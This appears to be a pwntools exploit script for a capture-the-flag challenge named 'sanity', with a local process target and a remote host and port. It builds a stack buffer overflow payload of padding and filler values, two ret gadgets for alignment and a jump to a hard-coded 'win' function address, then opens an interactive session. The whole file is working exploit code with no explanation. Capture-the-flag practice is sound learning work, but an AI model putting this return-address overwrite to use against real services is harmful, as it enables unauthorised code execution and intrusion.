from pwn import *
from sys import *

elf = ELF('./sanity')

p = process('./sanity')
HOST = 'dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io'
PORT = 7480

cmd = """
b*main
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

win = 0x00000000004006DB
ret = 0x000000000040078B

payload = b'A'*56
payload += p64(0xdeadbeef)*2
payload += p64(ret)
payload += p64(ret)
payload += p64(win)
p.sendline(payload)
p.interactive()